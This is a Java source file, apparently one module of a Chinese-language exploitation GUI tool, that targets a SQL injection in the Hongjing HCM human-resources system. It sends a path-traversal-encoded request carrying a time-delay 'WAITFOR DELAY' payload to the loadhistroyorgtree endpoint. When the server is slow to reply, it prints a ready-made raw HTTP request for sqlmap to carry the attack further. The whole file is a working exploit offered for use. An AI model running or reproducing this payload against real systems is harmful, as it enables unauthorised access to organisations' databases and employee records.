package exp.oa.hongjingoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools_getTime;

import java.util.HashMap;

public class hongjing_hcm_loadhistoryorgtree_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }


    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap head = new HashMap();
            long var = HttpTools_getTime.get(url + "/w_selfservice/oauthservlet/%2e./.%2e/general/inform/org/loadhistroyorgtree?isroot=child&parentid=1%27%3BWAITFOR+DELAY+%270%3A0%3A3%27--&kind=2&catalog_id=11&issuperuser=111&manageprive=111&action=111&target", head, "utf-8");
            if (var > 3000) {
                String target_req ="GET /w_selfservice/oauthservlet/%2e./.%2e/general/inform/org/loadhistroyorgtree?isroot=child&parentid=1%27%3BWAITFOR+DELAY+%270%3A0%3A3%27--&kind=2&catalog_id=11&issuperuser=111&manageprive=111&action=111&target HTTP/1.1\n" +
                        "Host: "+ url.substring(url.indexOf("://")+3)+"\n" +
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\n" +
                        "Accept-Encoding: gzip, deflate\n" +
                        "Accept-Language: zh-CN,zh;q=0.9\n" +
                        "Cache-Control: max-age=0\n" +
                        "Connection: close\n" +
                        "Upgrade-Insecure-Requests: 1";
                Platform.runLater(() -> {
                    textArea.appendText("\n [ hongjing_hcm_loadhistoryorgtree_sqli ]");
                    textArea.appendText("\n 利用sqlmap模块进行利用,payload保存为req文件使用");
                    textArea.appendText("\n ");
                });
                Platform.runLater(() -> {
                    textArea_cmd.appendText("\n----------------------------------------------------------------------\n"+
                            "\npayload:\n"+target_req +
                            "\n----------------------------------------------------------------------\n"+
                            "\n延时时间: "+var+"毫秒\n----------------------------------------------------------------------\n");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n ");
                });
                return false;
            }
        }catch (Exception E){
            return false;
        }
    }
}
